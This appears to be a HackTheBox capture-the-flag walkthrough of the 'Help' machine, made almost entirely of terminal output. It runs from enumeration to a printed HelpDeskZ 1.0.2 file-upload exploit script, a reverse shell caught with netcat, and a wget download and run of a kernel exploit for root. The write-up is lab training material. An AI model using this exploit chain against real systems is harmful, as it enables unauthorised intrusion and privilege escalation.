---
title: "HackTheBox - Help"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sV -sC 10.10.10.121  
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 14:02 CEST  
Nmap scan report for 10.10.10.121  
Host is up (0.027s latency).  
Not shown: 997 closed ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)  
| 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)  
|_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)  
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Apache2 Ubuntu Default Page: It works  
3000/tcp open http Node.js Express framework  
|_http-title: Site doesn't have a title (application/json; charset=utf-8).  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds  
root@kali:~# gobuster -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.121 -t 50

=====================================================  
Gobuster v2.0.1 OJ Reeves (@TheColonial)  
=====================================================  
[+] Mode : dir  
[+] Url/Domain : http://10.10.10.121/  
[+] Threads : 50  
[+] Wordlist : /usr/share/wordlists/dirb/common.txt  
[+] Status codes : 200,204,301,302,307,403  
[+] Timeout : 10s  
=====================================================  
2019/06/10 14:04:10 Starting gobuster  
=====================================================  
/.htpasswd (Status: 403)  
/.htaccess (Status: 403)  
/.hta (Status: 403)  
/index.html (Status: 200)  
/javascript (Status: 301)  
/server-status (Status: 403)  
/support (Status: 301)  
=====================================================  
2019/06/10 14:04:16 Finished  
=====================================================

root@kali:~# searchsploit helpdeskz  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Exploit Title | Path  
| (/usr/share/exploitdb/)  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
HelpDeskZ 1.0.2 - Arbitrary File Upload | exploits/php/webapps/40300.py  
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download | exploits/php/webapps/41200.py  
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------  
Shellcodes: No Result  
root@kali:~# searchsploit -m exploits/php/webapps/40300.py  
Exploit: HelpDeskZ 1.0.2 - Arbitrary File Upload  
URL: https://www.exploit-db.com/exploits/40300  
Path: /usr/share/exploitdb/exploits/php/webapps/40300.py  
File Type: troff or preprocessor input, ASCII text, with CRLF line terminators

Copied to: /root/40300.py

import hashlib  
import time  
import sys  
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:  
print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])  
sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]  
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 600):  
plaintext = fileName + str(currentTime - x)  
md5hash = hashlib.md5(plaintext).hexdigest()

url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'  
response = requests.head(url)  
if response.status_code == 200:  
print "found!"  
print url  
sys.exit(0)

print "Sorry, I did not find anything"

root@kali:~# python 40300.py http://10.10.10.121/support/ php-reverse-shell.php  
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit  
found!  
http://10.10.10.121/support/uploads/tickets/551a9079298f06e43893d9d6392bc80e.php

root@kali:~# cd Downloads/  
root@kali:~/Downloads# ls  
44298.c encrypt-pdf.py index.html irked.jpg pass.txt token token.pdf.enc  
root@kali:~/Downloads# python -m SimpleHTTPServer 80  
Serving HTTP on 0.0.0.0 port 80 ...  
10.10.10.121 - - [10/Jun/2019 14:32:06] "GET /44298.c HTTP/1.1" 200 -

root@kali:~# nc -lnvp 1234  
listening on [any] 1234 ...  
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.121] 57700  
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
05:22:33 up 2:15, 0 users, load average: 0.00, 0.00, 0.00  
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT  
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)  
/bin/sh: 0: can't access tty; job control turned off  
$ cd /home  
$ ls  
help  
$ cd help  
$ ls -alh  
total 76K  
drwxr-xr-x 7 help help 4.0K Jan 11 06:07 .  
drwxr-xr-x 3 root root 4.0K Nov 27 2018 ..  
-rw-rw-r-- 1 help help 272 Jan 11 06:17 .bash_history  
-rw-r--r-- 1 help help 220 Nov 27 2018 .bash_logout  
-rw-r--r-- 1 root root 1 Nov 27 2018 .bash_profile  
-rw-r--r-- 1 help help 3.7K Nov 27 2018 .bashrc  
drwx------ 2 help help 4.0K Nov 27 2018 .cache  
drwxr-xr-x 4 help help 4.0K Jun 10 03:07 .forever  
-rw------- 1 help help 442 Nov 28 2018 .mysql_history  
drwxrwxr-x 2 help help 4.0K Nov 27 2018 .nano  
drwxrwxr-x 290 help help 12K Jan 11 05:53 .npm  
-rw-r--r-- 1 help help 655 Nov 27 2018 .profile  
-rw-rw-r-- 1 help help 66 Nov 28 2018 .selected_editor  
-rw-r--r-- 1 help help 0 Nov 27 2018 .sudo_as_admin_successful  
-rw-rw-r-- 1 help help 225 Dec 11 01:53 .wget-hsts  
drwxrwxrwx 6 root root 4.0K Jan 11 05:53 help  
-rw-rw-r-- 1 help help 946 Nov 28 2018 npm-debug.log  
-rw-r--r-- 1 root root 33 Nov 28 2018 user.txt  
$ cat user.txt  
bb8#########ZENSIERT#########6af  
$ uname -a  
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
$ cd /tmp  
$ wget http://10.10.14.27/44298.c  
--2019-06-10 05:32:37-- http://10.10.14.27/44298.c  
Connecting to 10.10.14.27:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 6021 (5.9K) [text/plain]  
Saving to: '44298.c'

0K ..... 100% 535M=0s

2019-06-10 05:32:37 (535 MB/s) - '44298.c' saved [6021/6021]

$ gcc -o exploit 44298.c  
$ ./exploit  
whoami  
root  
cat /root/root.txt  
b7f#########ZENSIERT#########b98